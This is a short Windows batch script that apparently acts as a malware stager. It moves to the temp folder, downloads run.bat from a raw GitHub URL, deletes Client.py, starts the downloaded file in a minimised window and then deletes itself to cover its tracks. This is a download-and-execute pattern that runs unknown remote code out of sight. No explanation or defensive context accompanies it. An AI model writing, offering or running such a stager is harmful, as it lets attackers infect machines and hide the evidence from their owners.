cd %temp%
curl -o run.bat https://raw.githubusercontent.com/oogabooga245/-/main/run.bat
del Client.py
START /MIN CMD.EXE /C run.bat
cls
del 1.bat
exit
